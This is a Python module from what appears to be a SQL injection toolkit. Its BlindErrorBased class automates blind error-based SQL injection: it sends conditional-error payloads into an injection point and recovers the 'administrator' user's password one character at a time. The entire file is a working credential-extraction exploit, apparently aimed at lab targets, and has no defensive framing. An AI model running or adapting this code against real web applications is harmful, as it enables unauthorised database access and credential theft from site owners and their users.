from .main import BaseSQLi
from .dbConfig import DB_CONFIG
import requests
import string

class BlindErrorBased(BaseSQLi):
    found_password = ""
    def __init__(self, url, inject_point, targetTable, db_type="oracle", extra_cookies=None):
        super().__init__(url, targetTable, db_type, inject_point, extra_cookies)
        self.found_password = "" 

    def extract(self, column, username='administrator'):
        for position in range(1, 30):
            for char in string.ascii_lowercase + string.digits:
                payload = f"'||(SELECT CASE WHEN ({DB_CONFIG[self.db_type]['substr']}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1)='{char}') THEN {DB_CONFIG[self.db_type]['error_trigger']} ELSE '' END{DB_CONFIG[self.db_type]['from_dual']})||'"
                response = self.send(payload)
                if "Internal Server Error" in response.text:
                    self.found_password += char
                    print(f"[+] Position {position}: {char}  →  {self.found_password}")
                    break
            else:
                break
        return self.found_password